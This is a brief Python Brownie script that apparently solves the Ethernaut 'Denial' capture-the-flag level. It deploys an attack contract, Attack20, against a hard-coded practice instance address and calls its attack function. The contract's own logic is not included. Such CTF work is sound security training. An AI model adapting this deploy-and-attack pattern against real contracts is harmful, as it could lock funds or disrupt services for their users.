from scripts.helpful_scripts import get_account
from brownie import web3, interface, convert, Attack20
from eth_utils import keccak


ETHERNAUT_INSTANCE = "0x870f1B57394e7a7E5C89f4F2B3111f922CF75555"
GAS_LIMIT = 6000000


def main():

    player = get_account()
    target = interface.IDenial(ETHERNAUT_INSTANCE)

    attack = Attack20.deploy(ETHERNAUT_INSTANCE, {"from": player})

    attack.attack({"from": player})
